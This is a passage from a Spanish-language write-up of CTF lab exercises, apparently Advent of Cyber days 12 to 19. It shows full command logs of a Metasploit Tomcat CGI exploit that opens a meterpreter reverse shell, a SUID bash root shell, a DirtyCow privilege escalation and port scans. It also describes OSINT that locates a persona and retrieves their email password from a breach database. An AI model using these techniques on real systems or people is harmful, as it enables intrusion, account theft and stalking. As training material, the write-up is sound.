- snip ... -rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap -rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap -rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-xr-- 1 root messagebus 42K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 111K Jul 10 14:00 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -bash-4.4$ Utilizamos bash para obtener una shell root y la flag.\n1 2 3 4 5 6 7 8 9 10 11 -bash-4.4$ /bin/bash -p bash-4.4# cd bash-4.4# whoami; pwd root /home/cmnatic bash-4.4# cd /root bash-4.4# ls flag.txt bash-4.4# cat flag.txt thm{2fb1[... snip ...]592} bash-4.4# DAY 12 - Networking Se presenta una maquina vulnerable a ShellShock attack utilizando metasploit y la informacion descrita en el reto del dia es posible resolver las tareas y obtener la flag.\nConfiguracion de metasploit con el exploit windows/http/tomcat_cgi_cmdlineargs.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) \u0026gt; show options Module options (exploit/windows/http/tomcat_cgi_cmdlineargs): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.92.152 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 8080 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes The URI path to CGI script VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 10.2.29.162 yes The listen address (an interface may be specified) LPORT 1338 yes The listen port Exploit target: Id Name -- ---- 0 Apache Tomcat 9.0 or prior for Windows msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) \u0026gt; set TARGETURI /cgi-bin/elfwhacker.bat TARGETURI =\u0026gt; /cgi-bin/elfwhacker.bat msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) \u0026gt; run [*] Started reverse TCP handler on 10.2.29.162:1338 [*] Checking if 10.10.92.152 is vulnerable [*] 10.10.92.152 seems vulnerable, what a good day. [*] Command Stager progress - 6.95% done (6999/100668 bytes) [*] Command Stager progress - 13.91% done (13998/100668 bytes) [*] Command Stager progress - 20.86% done (20997/100668 bytes) [*] Command Stager progress - 27.81% done (27996/100668 bytes) [*] Command Stager progress - 34.76% done (34995/100668 bytes) [*] Command Stager progress - 41.72% done (41994/100668 bytes) [*] Command Stager progress - 48.67% done (48993/100668 bytes) [*] Command Stager progress - 55.62% done (55992/100668 bytes) [*] Command Stager progress - 62.57% done (62991/100668 bytes) [*] Command Stager progress - 69.53% done (69990/100668 bytes) [*] Command Stager progress - 76.48% done (76989/100668 bytes) [*] Command Stager progress - 83.43% done (83988/100668 bytes) [*] Command Stager progress - 90.38% done (90987/100668 bytes) [*] Command Stager progress - 97.34% done (97986/100668 bytes) [*] Command Stager progress - 100.02% done (100692/100668 bytes) [*] Sending stage (176195 bytes) to 10.10.92.152 [*] Meterpreter session 1 opened (10.2.29.162:1338 -\u0026gt; 10.10.92.152:49815) at 2020-12-14 12:36:58 -0500 meterpreter \u0026gt; search -f flag1.txt Found 1 result... c:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\\flag1.txt (27 bytes) meterpreter \u0026gt; meterpreter \u0026gt; shell Process 2744 created. Channel 2 created. Microsoft Windows [Version 10.0.17763.1637] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 4277-4242 Directory of C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin 14/12/2020 23:37 \u0026lt;DIR\u0026gt; . 14/12/2020 23:37 \u0026lt;DIR\u0026gt; .. 14/12/2020 23:37 73,802 DXKwV.exe 19/11/2020 21:39 825 elfwhacker.bat 19/11/2020 22:06 27 flag1.txt 3 File(s) 74,654 bytes 2 Dir(s) 6,550,839,296 bytes free C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt;type flag1.txt type flag1.txt thm{whacking[... snip ...]elves} C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt; Utilizando local_exploit_suggester para listar los exploits para la maquina que puedan ser utiles para escalar privilegios.\n1 2 3 4 5 6 7 meterpreter \u0026gt; run post/multi/recon/local_exploit_suggester [*] 10.10.92.152 - Collecting local exploits for x86/windows... [*] 10.10.92.152 - 30 exploit checks are being tried... [+] 10.10.92.152 - exploit/windows/local/ikeext_service: The target appears to be vulnerable. [+] 10.10.92.152 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. meterpreter \u0026gt; Aunque el usuario actual al parecer ya pertenece al grupo de Administradores.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt;whoami whoami tbfc-web-01\\elfmcskidy C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\u0026gt;net user elfmcskidy net user elfmcskidy User name elfmcskidy Full Name elfmcskidy Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 19/11/2020 13:16:41 Password expires Never Password changeable 19/11/2020 13:16:41 Password required Yes User may change password No Workstations allowed All Logon script User profile Home directory Last logon 14/12/2020 23:21:08 Logon hours allowed All Local Group Memberships *Administrators *Users Global Group memberships *None DAY 13 - Coal for Christmas Con la maquina dada se realiza las siguientes tareas con la ayuda de la descripcion de cada una:\nPort Scanning Initial Access Enumeration Privilege Escalation PORT SCANNING - NMAP Se realiza un escaneo de puertos donde encontramos los puertos ssh (22), telnet (23) y rpcbind (111).\n1 2 3 4 5 6 7 8 9 10 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-14 13:23 EST Nmap scan report for 10.10.155.23 (10.10.155.23) Host is up (0.25s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 23/tcp open telnet 111/tcp open rpcbind Nmap done: 1 IP address (1 host up) scanned in 52.89 seconds INITIAL ACCESS - TELNET A traves del puerto 23 de telnet realizamos la conexion donde se presentan unas credenciales con las cuales se logró obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 kali@kali:~/thm/adventcyber2$ telnet 10.10.155.23 23 Trying 10.10.155.23... Connected to 10.10.155.23. Escape character is \u0026#39;^]\u0026#39;. HI SANTA!!! We knew you were coming and we wanted to make it easy to drop off presents, so we created an account for you to use. Username: santa Password: clauschristmas We left you cookies and milk! christmas login: santa Password: Last login: Sat Nov 21 20:37:37 UTC 2020 from 10.0.2.2 on pts/2 \\ / --\u0026gt;*\u0026lt;-- /o\\ /_\\_\\ /_/_0_\\ /_o_\\_\\_\\ /_/_/_/_/o\\ /@\\_\\_\\@\\_\\_\\ /_/_/O/_/_/_/_\\ /_\\_\\_\\_\\_\\o\\_\\_\\ /_/0/_/_/_0_/_/@/_\\ /_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\ /_/o/_/_/@/_/_/o/_/0/_\\ [___] $ whoami; pwd santa /home/santa $ ENUMERATION Version del sistema operativo Ubuntu 12.04.\n1 2 3 4 5 6 7 8 $ uname -a Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux $ cat /etc/*release DISTRIB_ID=Ubuntu DISTRIB_RELEASE=12.04 DISTRIB_CODENAME=precise DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 12.04 LTS\u0026#34; $ En la maquina existe un archivo el cual está escrito en C, que al realizar una busqueda de una porcion de codigo encontramos que es parte del exploit de dirtycow. Aunque en la descripcion del reto se explica esta parte.\nPRIVILEGE ESCALATION Utilizando el codigo fuente del exploit encontrado en la maquina para obtener una shell con usuario root, copiando el codigo fuente a la maquina, compilar y ejecutar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 $ gcc -pthread dirty.c -o dirty -lcrypt $ ls -lah total 44K drwxr-xr-x 3 santa santa 4.0K Dec 15 00:46 . drwxr-xr-x 3 root root 4.0K Nov 21 20:37 .. drwx------ 2 santa santa 4.0K Nov 21 20:37 .cache -rwxr-xr-x 1 santa santa 1.4K Nov 21 20:37 christmas.sh -rw-r--r-- 1 santa santa 2.9K Nov 21 20:37 cookies_and_milk.txt -rwxrwxr-x 1 santa santa 14K Dec 15 00:46 dirty -rw-rw-r-- 1 santa santa 4.8K Dec 14 18:45 dirty.c $ chmod +x dirty $ ./dirty /etc/passwd successfully backed up to /tmp/passwd.bak Please enter the new password: Complete line: firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash mmap: 7f4c58c6b000 madvise 0 ptrace 0 Done! Check /etc/passwd to see if the new user was created. You can log in with the username \u0026#39;firefart\u0026#39; and the password \u0026#39;test\u0026#39;. DON\u0026#39;T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd Done! Check /etc/passwd to see if the new user was created. You can log in with the username \u0026#39;firefart\u0026#39; and the password \u0026#39;test\u0026#39;. DON\u0026#39;T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd $ su firefart Password: firefart@christmas:/# cd /root firefart@christmas:~# ls -lah total 24K drwx------ 2 firefart root 4.0K Nov 21 20:38 . drwxr-xr-x 24 firefart root 4.0K Nov 21 20:38 .. -rw------- 1 firefart root 0 Nov 21 20:38 .bash_history -rw-r--r-- 1 firefart root 3.1K Apr 19 2012 .bashrc -rwxr-xr-x 1 firefart root 1.4K Nov 21 20:37 christmas.sh -rw-r--r-- 1 firefart root 611 Nov 21 20:37 message_from_the_grinch.txt -rw-r--r-- 1 firefart root 140 Apr 19 2012 .profile firefart@christmas:~# cat mess* Nice work, Santa! Wow, this house sure was DIRTY! I think they deserve coal for Christmas, don\u0026#39;t you? So let\u0026#39;s leave some coal under the Christmas `tree`! Let\u0026#39;s work together on this. Leave this text file here, and leave the christmas.sh script here too... but, create a file named `coal` in this directory! Then, inside this directory, pipe the output of the `tree` command into the `md5sum` command. The output of that command (the hash itself) is the flag you can submit to complete this task for the Advent of Cyber! - Yours, John Hammond er, sorry, I mean, the Grinch - THE GRINCH, SERIOUSLY firefart@christmas:~# touch coal firefart@christmas:~# tree | md5sum 8b16f0[... SNIP ...]f7f8427cc - firefart@christmas:~# DAY 14 - Where\u0026rsquo;s Rudolph? Se presenta un reto en el cual involucra un nombre de usuario: IGuidetheClaus2020. con el cual debemos de recabar informacion utilizando fuentes de datos abiertas (OSINT). Para las tareas del 1-5 debemos de indagar en el subreddit de este usuario, para la 6-11 en su cuenta de Twitter.\n1: https://www.reddit.com/user/IGuidetheClaus2020/comments/\n2: https://www.reddit.com/r/books/comments/jsvby8/chicago_public_library_says_eliminating_fines_has/gdjz4ef/?context=3\n3: Como se menciona en esta tarea, utilizamos Google para buscar el apellido del Creador de Rudolph.\n4: En los resultados de busqueda de Google aparece el usuario en: Twitter\n5: Su cuenta de usuario: @IGuideClaus2020\n6: De acuerdo con su cuenta de twitter, a este usuario parece interesarle el programa de TV Bachelorette el cual tiene más retwitts y \u0026ldquo;favs\u0026rdquo;.\n7: En uno de sus twitts se presentan dos imagenes las cuales utilizamos para obtener la ubicacion del estado donde fueron tomadas, con Google Images: Chicago\n8: En uno de sus twitts escribe la URL de la imagen en \u0026ldquo;alta resolucion\u0026rdquo; del lugar donde desfiló. Utilizando Jeffrey's Image Metadata Viewer logramos obtener la ubicacion de GPS (EXIF: Latitude y Longitude).\n9: Con la pagina en la tarea anterior tambien encontramos la flag.\n10: En la cuenta de twitter especificamente en su biografia, aparece un correo electronico. Con la ayuda de scylla.sh logramos obtener la contraseña de su correo electronico.\n11: Utilizando la ubicacion (longitud/latitud) que encontramos en la Tarea 8, buscamos el numero de calle del hotel más cercano donde se hospedó.\nDel porqué esa direccion, es porque tambien mencionó en uno de sus twitts que la foto era cerca de su hotel y tiempo despues mencionó el hotel Marriot.\nDAY 15 - Scripting Se presenta una serie de tareas relacionadas al lenguaje de programacion Python las cuales es posible resolver con la descripcion del reto del dia y utilizando una consola de Python.\nSpoiler warning What's the output of True + True?\r2\rWhat's the database for installing other peoples libraries called?\rPypi\rWhat is the output of bool(\u0026quot;False\u0026quot;)?\rTrue\rWhat library lets us download the HTML of a webpage?\rrequests\rWhat is the output of the program provided in \u0026quot;Code to analyse for Question 5\u0026quot; in today's material?\r[1, 2, 3, 6]\rWhat causes the previous task to output that?\rpass by reference\rDAY 16 - Scripting Continuando con scripting, se presenta una maquina a la cual hay que encontrar:\nPuerto donde esta corriendo la pagina web. Un directorio/pagina oculta. Numero impar correcto de la API key. Utilizando el modulo python-nmap de PyPI creamos un pequeño script para escaneo de puertos, con el cual encontramos el puerto 8000 abierto.\njava\rjavascript\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env python import nmap host = \u0026#39;10.10.133.55\u0026#39; nm = nmap.PortScanner() nm.scan(host, \u0026#39;-p- --min-rate 1000 -sV\u0026#39;) for host in nm.all_hosts(): print(\u0026#39;----------------------------------------------------\u0026#39;) print( \u0026#39;Host:{} {}\u0026#39;.format(host, nm[host].hostname()) ) print( \u0026#39;Estado: {}\u0026#39;.format(nm[host].state()) ) print(\u0026#39;----------------------------------------------------\u0026#39;) for i in nm[host].all_protocols(): print(\u0026#39;Protocolo: {}\u0026#39;.format(i)) print(\u0026#39;----------------------------------------------------\u0026#39;) ports = nm[host][i].keys() ports.sort() for port in ports: print(\u0026#39;Puerto: {} \\t Estado: {}\u0026#39;.format(port, nm[host][i][port][\u0026#34;state\u0026#34;])) 1 2 3 4 5 6 7 8 9 kali@kali:~/thm/adventcyber2$ python script2.py ---------------------------------------------------- Host:10.10.133.55 10.10.133.55 Estado: up ---------------------------------------------------- Protocolo: tcp ---------------------------------------------------- Puerto: 8000 Estado: open kali@kali:~/thm/adventcyber2$ Nuevamente utilizando Python y con la lo aprendido el Dia 15 extrajimos todos las direcciones o links dentro de la pagina.\npython\rbash\r1 2 3 4 5 6 7 8 9 10 import requests from bs4 import BeautifulSoup url = \u0026#34;http://10.10.133.55:8000/static/index.html\u0026#34; req = requests.get(url) soup = BeautifulSoup(req.content, \u0026#39;lxml\u0026#39;) links = soup.find_all(\u0026#34;a\u0026#34;) for link in links: print(link.get(\u0026#39;href\u0026#39;)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 kali@kali:~/thm/adventcyber2$ python script3.py ../ None https://github.com/BulmaTemplates/bulma-templates/blob/master/templates/hero.html https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com https://tryhackme.com # # # # # # # # # http://machine_ip/api/api_key # # # # # # # # # https://github.com/BulmaTemplates/bulma-templates https://github.com/BulmaTemplates/bulma-templates Para poder encontrar el valor correcto de la api_key utilizamos un pequeño script el cual realizaba solicitude hacia la API.\npython\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 #!/usr/bin/env python import requests url = \u0026#34;http://10.10.133.55:8000/api/\u0026#34; for i in range(0,100): n = i if i%2 != 0 else 0 if n != 0: print(str(n)) req = requests.get(url+str(n)) print(req.text) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 kali@kali:~/thm/adventcyber2$ python script4.py 1 {\u0026#34;item_id\u0026#34;:1,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 3 {\u0026#34;item_id\u0026#34;:3,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 5 {\u0026#34;item_id\u0026#34;:5,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 7 {\u0026#34;item_id\u0026#34;:7,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 9 {\u0026#34;item_id\u0026#34;:9,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 11 {\u0026#34;item_id\u0026#34;:11,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 13 {\u0026#34;item_id\u0026#34;:13,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 15 [... snip ...] 55 {\u0026#34;item_id\u0026#34;:55,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 57 {\u0026#34;item_id\u0026#34;:57,\u0026#34;q\u0026#34;:\u0026#34;Winter Wonderland, Hyde Park, London.\u0026#34;} 59 {\u0026#34;item_id\u0026#34;:59,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 61 {\u0026#34;item_id\u0026#34;:61,\u0026#34;q\u0026#34;:\u0026#34;SANTA PROTECTION MECHANISM ACTIVATED.\u0026#34;} 63 ^C DAY 17 - Reverse Engineering Las instrucciones para el reto del dia incluyen utilizar la herramienta radare2 el cual es un framework para realizar ingenieria inversa y analisis de binarios. La descripcion del reto es suficiente para obtener las respuestas.\nValor de local_ch cuando la instruccion movl es \u0026ldquo;ejecutada\u0026rdquo;. El valor de eax cuando la instruccion ìmull es \u0026ldquo;ejecutada\u0026rdquo;. El valor de local_4h despues de que eax tiene el valor 0. Se inicia radare2 con el archivo challenge1, se indica que se realizará un analisis con el \u0026ldquo;comando\u0026rdquo; aa. Con el \u0026ldquo;comando\u0026rdquo; afl listamos todas las funciones presentes en el archivo y junto con | grep main \u0026ldquo;filtramos\u0026rdquo; los valores de la funcion principal main. Con el nombre de la funcion se realiza un desensamblado de la funcion con el \u0026ldquo;comando\u0026rdquo; pdf @sym.main o pdf @main, lo que mostrará el codigo en ensamblador para su analisis.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 elfmceager@tbfc-day-17:~$ r2 -d ./challenge1 Process with PID 1506 started... = attach 1506 1506 bin.baddr 0x00400000 Using 0x400000 Warning: Cannot initialize dynamic strings asm.bits 64 [0x00400a30]\u0026gt; aa [ WARNING : block size exceeding max block size at 0x006ba220 [+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x006bc860 [+] Try changing it with e anal.bb.maxsize [x] Analyze all flags starting with sym. and entry0 (aa) [0x00400a30]\u0026gt; afl |grep main 0x00400b4d 1 35 sym.main 0x00400de0 10 1007 -\u0026gt; 219 sym.__libc_start_main 0x00403840 39 661 -\u0026gt; 629 sym._nl_find_domain 0x00403ae0 308 5366 -\u0026gt; 5301 sym._nl_load_domain 0x00415ef0 1 43 sym._IO_switch_to_main_get_area 0x0044ce10 1 8 sym._dl_get_dl_main_map 0x00470430 1 49 sym._IO_switch_to_main_wget_area 0x0048f9f0 7 73 -\u0026gt; 69 sym._nl_finddomain_subfreeres 0x0048fa40 16 247 -\u0026gt; 237 sym._nl_unload_domain [0x00400a30]\u0026gt; pdf @sym.main ;-- main: / (fcn) sym.main 35 | sym.main (); | ; var int local_ch @ rbp-0xc | ; var int local_8h @ rbp-0x8 | ; var int local_4h @ rbp-0x4 | ; DATA XREF from 0x00400a4d (entry0) | 0x00400b4d 55 push rbp | 0x00400b4e 4889e5 mov rbp, rsp | 0x00400b51 c745f4010000. mov dword [local_ch], 1 | 0x00400b58 c745f8060000. mov dword [local_8h], 6 | 0x00400b5f 8b45f4 mov eax, dword [local_ch] | 0x00400b62 0faf45f8 imul eax, dword [local_8h] | 0x00400b66 8945fc mov dword [local_4h], eax | 0x00400b69 b800000000 mov eax, 0 | 0x00400b6e 5d pop rbp \\ 0x00400b6f c3 ret [0x00400a30]\u0026gt; Para resolver la primera pregunta debemos de ubicarnos donde se encuentra la instruccion mov, donde agregámos un breakpoint para que cuando ejecutemos el programa, este haga una pausa y poder analisar el valor de local_ch. Tambien necesitamos la direccion en memoria de local_ch (las primeras lineas de la funcion main) que tiene como valor rbp-0xc. En el siguiente codigo se muestran ambas lineas.\n1 2 3 ; var int local_ch @ rbp-0xc [... snip ...] | 0x00400b51 c745f4010000. mov dword [local_ch], 1 Para agregar un breakpoint lo realizamos con el \u0026ldquo;comando\u0026rdquo; db direcciondememoria, quedaria de la siguiente forma: db 0x00400b51, ejecutamos el programa con el \u0026ldquo;comando\u0026rdquo; dc, vemos un mensaje que la ejecucion está en \u0026ldquo;pausa\u0026rdquo; en la direccion 400b51 (la indicada con db 0x00400b51) y al mostrar el codigo (pdf @sym.main) vemos resaltada la direccion de memoria y el breakpoint (una pequeña b).\nSi revisamos el valor actual de local_ch vemos que es 0000 , porque la direccion de memoria a la que estamos realizando lectura hace referencia al valor inicial al inicio de la funcion main (; var int local_ch @ rbp-0xc) es por ello que hay que realizar un \u0026ldquo;paso siguiente\u0026rdquo; con el \u0026ldquo;comando\u0026rdquo; ds para obtener el valor de local_ch. Vemos que su valor es 0100.\nPara la segunda pregunta creamos un breakpoint en la direccion de memoria de la instruccion imul (db 0x00400b62).\n1 | 0x00400b62 0faf45f8 imul eax, dword [local_8h] Nuevamente vemos el breakpoint, realizamos un \u0026ldquo;paso siguiente\u0026rdquo; (ds) y la lectura del valor de eax con el \u0026ldquo;comando\u0026rdquo; dr (valor de rax).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 [0x00400a30]\u0026gt; db 0x00400b62 [0x00400a30]\u0026gt; dc hit breakpoint at: 400b62 [0x00400b62]\u0026gt; pdf @main ;-- main: / (fcn) sym.main 35 | sym.main (); | ; var int local_ch @ rbp-0xc | ; var int local_8h @ rbp-0x8 | ; var int local_4h @ rbp-0x4 | ; DATA XREF from 0x00400a4d (entry0) | 0x00400b4d 55 push rbp | 0x00400b4e 4889e5 mov rbp, rsp | 0x00400b51 c745f4010000. mov dword [local_ch], 1 | 0x00400b58 c745f8060000. mov dword [local_8h], 6 | 0x00400b5f 8b45f4 mov eax, dword [local_ch] | ;-- rip: | 0x00400b62 b 0faf45f8 imul eax, dword [local_8h] | 0x00400b66 8945fc mov dword [local_4h], eax | 0x00400b69 b800000000 mov eax, 0 | 0x00400b6e 5d pop rbp \\ 0x00400b6f c3 ret [0x00400b62]\u0026gt; ds [0x00400b62]\u0026gt; dr rax = 0x00000006 rbx = 0x00400400 [ ... snip ... ] [0x00400b62]\u0026gt; Para resolver la ultima pregunta debemos de crear un breakpoint en:\n1 | 0x00400b69 b800000000 mov eax, 0 Y obtener el valor de local_4h (rbp-0x4).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 [0x00400a30]\u0026gt; pdf @main ;-- main: / (fcn) sym.main 35 | sym.main (); | ; var int local_ch @ rbp-0xc | ; var int local_8h @ rbp-0x8 | ; var int local_4h @ rbp-0x4 | ; DATA XREF from 0x00400a4d (entry0) | 0x00400b4d 55 push rbp | 0x00400b4e 4889e5 mov rbp, rsp | 0x00400b51 c745f4010000. mov dword [local_ch], 1 | 0x00400b58 c745f8060000. mov dword [local_8h], 6 | 0x00400b5f 8b45f4 mov eax, dword [local_ch] | 0x00400b62 0faf45f8 imul eax, dword [local_8h] | 0x00400b66 8945fc mov dword [local_4h], eax | 0x00400b69 b800000000 mov eax, 0 | 0x00400b6e 5d pop rbp \\ 0x00400b6f c3 ret [0x00400a30]\u0026gt; db 0x00400b69 [0x00400a30]\u0026gt; dc hit breakpoint at: 400b69 [0x00400b69]\u0026gt; pdf @main ;-- main: / (fcn) sym.main 35 | sym.main (); | ; var int local_ch @ rbp-0xc | ; var int local_8h @ rbp-0x8 | ; var int local_4h @ rbp-0x4 | ; DATA XREF from 0x00400a4d (entry0) | 0x00400b4d 55 push rbp | 0x00400b4e 4889e5 mov rbp, rsp | 0x00400b51 c745f4010000. mov dword [local_ch], 1 | 0x00400b58 c745f8060000. mov dword [local_8h], 6 | 0x00400b5f 8b45f4 mov eax, dword [local_ch] | 0x00400b62 0faf45f8 imul eax, dword [local_8h] | 0x00400b66 8945fc mov dword [local_4h], eax | ;-- rip: | 0x00400b69 b b800000000 mov eax, 0 | 0x00400b6e 5d pop rbp \\ 0x00400b6f c3 ret [0x00400b69]\u0026gt; px @ rbp-0x4 - offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 0x7fff5ff5ce7c 0600 0000 4018 4000 0000 0000 e910 4000 ....@.@.......@. 0x7fff5ff5ce8c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5ce9c 0100 0000 a8cf f55f ff7f 0000 4d0b 4000 ......._....M.@. 0x7fff5ff5ceac 0000 0000 0000 0000 0000 0000 0600 0000 ................ 0x7fff5ff5cebc 5500 0000 5000 0000 0700 0000 0000 0000 U...P........... 0x7fff5ff5cecc 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5cedc 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5ceec 0000 0000 0004 4000 0000 0000 f9c4 2eff ......@......... 0x7fff5ff5cefc 5fdd 6099 e018 4000 0000 0000 0000 0000 _.`...@......... 0x7fff5ff5cf0c 0000 0000 1890 6b00 0000 0000 0000 0000 ......k......... 0x7fff5ff5cf1c 0000 0000 f9c4 8e52 3462 9e66 f9c4 9aee .......R4b.f.... 0x7fff5ff5cf2c 5fdd 6099 0000 0000 0000 0000 0000 0000 _.`............. 0x7fff5ff5cf3c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5cf4c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5cf5c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5cf6c 0000 0000 0000 0000 0000 0000 0000 0000 ................ [0x00400b69]\u0026gt; DAY 18 - Reverse Engineering Continuando con Ingenieria Inversa, esta vez con un archivo escrito en .NET, para su analisis utilizamos la herramienta que provee THM: ILSpy, en la maquina ofrecida en el reto del dia.\nAl ejecutar el archivo pregunta por una contraseña, y al ingresar un string cualquiera nos muestra un mensaje.\nUtilizando ILSpy para analizar el archivo vemos varias funciones de la aplicacion dentro del Formulario principal que manejan los diferentes componentes como botones, labels, textbox, etc., una de estas analiza que la contraseña ingresada sea a la misma que se encuentra en un \u0026ldquo;Array\u0026rdquo;. Tambien se logra ver los mensaje de cuando la contraseña es incorrecta y correcta.\nAl dirigirnos al \u0026ldquo;array\u0026rdquo; que contiene la contraseña, aunque no aparece en texto plano la informacion que se encuentra comentada (data(\u0026hellip;)) podria darnos el valor ya que el la aplicacion no logra obtener dicho valor.\nLa informacion esta en hexadecimal por lo que al decodificarlo vemos la contraseña. El valor final 00 se omite ya que hace referencia al final del \u0026ldquo;string\u0026rdquo;.\n1 2 73 61 6E 74 61 70 61 73 73 77 6F 72 64 33 32 31 santapassword321 Ingresamos la contraseña encontrada y vemos un mensaje junto con nuestra flag.\nDAY 19 - The Naughty or Nice List La descripcion del reto del dia indica que la aplicacion web es vulnerable a Server-Side 